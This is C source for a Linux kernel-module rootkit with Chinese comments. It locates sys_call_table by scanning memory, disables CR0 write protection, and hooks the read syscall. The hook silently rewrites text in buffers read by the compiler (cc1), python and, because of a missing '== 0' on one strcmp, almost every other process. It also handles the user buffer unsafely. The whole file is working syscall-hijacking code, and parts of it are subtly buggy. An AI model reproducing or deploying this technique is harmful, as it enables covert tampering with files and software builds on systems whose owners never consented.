/* simple-rootkit.c */
/* 
 * 在Debian 7.5 Linux debian 3.2.0-4-amd64 #1 SMP Debian 3.2.84-1 x86_64 GNU/Linux上测试正常 
 */

#include <linux/module.h> 
#include <linux/kernel.h> 
#include <linux/syscalls.h> 
#include <asm/paravirt.h> 
#include <linux/sched.h>

/* sys_call_table是const，但我们可以将自己的变量指向它的内存位置来绕过它。*/
unsigned long **sysn_call_table;

/*控制寄存器的值决定了存储器是否存在受保护。 我们需要修改它，关闭内存保护
*为了写入读取系统调用。 这里我们存储初始
*控制寄存器值，以便我们在完成后将其设置回来
*（内存保护一般都很好）！
*/
unsigned long original_cr0;

/*写入系统调用的原型。 这是我们存储原件的地方
 *在我们在sys_call_table中交换它之前。
 */
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);

/*我们新的系统调用功能; 原始读取的包装器. */
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    /*执行原始写调用，并保持其返回值
      *现在我们可以在退出之前添加我们想要的任何缓冲区
      * 功能.
    */
    long ret;
    ret = ref_sys_read(fd, buf, count);
	
    if (fd > 2) {
        /*我们可以从当前任务结构中找到当前任务名称,然后用它来决定我们是否想换掉数据
            *在返回给用户之前的读缓冲区中。注意：cc1是打开源文件的任务的名称
            *在通过gcc编译期间。    
     */
       if (strcmp(current->comm, "cc1") == 0 ||
            strcmp(current->comm, "python") == 0 ||
            strcmp(current->comm, "*.sh")) {
            char *substring = strstr(buf, "World!");
            if (substring != NULL) {
                substring[0] = 'D';
                substring[1] = 'e';
                substring[2] = 'b';
                substring[3] = 'i';
                substring[4] = 'a';
                substring[5] = 'n';
            }
        }
    }
return ret;
}

/* 这里的全部技巧是在内存中找到syscall表,所以我们可以将它复制到非const指针数组，
*然后，关闭内存保护，以便我们可以修改系统调用表.
 */
static unsigned long **aquire_sys_call_table(void)
{
    	/* PAGE_OFFSET是一个宏，它告诉我们内核内存开始的偏移量，
*这使我们无法在用户空间内存中搜索我们的系统调用表  	
*/
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;
	/*扫描内存，搜索连续的syscall表*/
	printk("Starting syscall table scan from: %lx\n", offset);
	while (offset < ULLONG_MAX) {
        	/*转换起始偏移量以匹配系统调用表类型*/
		sct = (unsigned long **)offset;

        	/*我们正在扫描与sct匹配的模式[__ NR_close]
              *所以我们只是增加'偏移'直到我们找到它.
          */
		if (sct[__NR_close] == (unsigned long *) sys_close) {
			printk("Syscall table found at: %lx\n", offset);
			return sct;
		}
		offset += sizeof(void *);
	}
	return NULL;
}
static int __init rootkit_start(void)
{
    //在内存中找到syscall表
    if(!(sysn_call_table = aquire_sys_call_table()))
        return -1;
//记录cr0寄存器中的初始值
original_cr0 = read_cr0();
    //设置cr0寄存器以关闭写保护
    write_cr0(original_cr0 & ~0x00010000);
    // 复制旧的读调用
    ref_sys_read = (void *)sysn_call_table[__NR_read]; 
    //将我们修改过的读调用写入syscall表
    sysn_call_table[__NR_read] = (unsigned long *)new_sys_read;
    //重新打开内存保护
    write_cr0(original_cr0);
	return 0;
}
static void __exit rootkit_end(void)
{
	if(!sysn_call_table) {
		return;
	}

    //关闭内存保护
    write_cr0(original_cr0 & ~0x00010000);
    //将旧系统调用回原位
    sysn_call_table[__NR_read] = (unsigned long *)ref_sys_read;
    //记忆保护重新开始
    write_cr0(original_cr0);
}
module_init(rootkit_start);
module_exit(rootkit_end);
MODULE_LICENSE("GPL");
